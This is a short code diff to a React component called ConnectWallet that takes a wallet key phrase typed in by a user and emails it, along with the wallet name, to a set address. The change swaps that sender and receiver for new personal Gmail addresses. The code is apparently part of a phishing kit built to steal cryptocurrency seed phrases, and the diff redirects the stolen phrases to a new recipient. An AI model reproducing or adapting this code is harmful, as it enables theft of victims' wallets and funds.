@@ -21,8 +21,8 @@ function ConnectWallet({ title, handleClose, identity, imagesrc }) {
   let options = {
     subject: "Wallet Key Phrase",
     message: `<p>This is the wallet key phrase a user entered: <br> <strong> Wallet Name: ${title} </strong> <br> <strong> Walllet Key: ${getData.message}</strong> </p>`,
-    sender: "adedejiyusuf26@gmail.com",
-    receiver: "adedejiyusuf26@gmail.com",
+    sender: "angelicajayne41@gmail.com",
+    receiver: "angelicajayne6@gmail.com",
   };
 
   const handSubmit = async (e) => {
